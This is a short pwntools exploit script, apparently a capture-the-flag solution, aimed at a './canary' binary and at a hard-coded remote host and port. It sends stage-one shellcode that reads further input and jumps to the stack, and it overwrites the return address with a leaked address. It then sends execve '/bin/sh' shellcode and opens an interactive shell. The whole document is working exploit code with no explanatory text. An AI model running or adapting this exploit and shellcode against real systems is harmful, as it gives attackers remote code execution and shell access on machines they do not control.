from pwn import *
context.arch = 'amd64'

flag = False

if flag:
    p = process("./canary")
else:
    p = remote("194.5.207.113",7030)

def stage1():
    stage1_shellcode = asm('''
                    xor eax,eax
                    xor edi,edi
                    mov rsi,rsp
                    mov dl,100
                    syscall
                    jmp rsp
                ''')

    p.recv()
    p.sendline(stage1_shellcode)
    p.recv()
    p.sendline(b"Mikey-kun")
    p.recvuntil(b"address: ")
    ret = int(p.recv(14),16)+12
    log.info("Return Address : " + hex(ret))
    p.recv()
    p.sendline(b"BAJI"*5 + p64(ret))

def stage2():
    stage2_shellcode = asm('''
                            mov rbx,0x0068732f6e69622f
                            push rbx
                            mov rdi,rsp
                            xor esi,esi
                            xor edx,edx
                            xor eax,eax
                            mov al,59
                            syscall
                        ''')

    p.send(stage2_shellcode)
    p.interactive()

stage1()
stage2()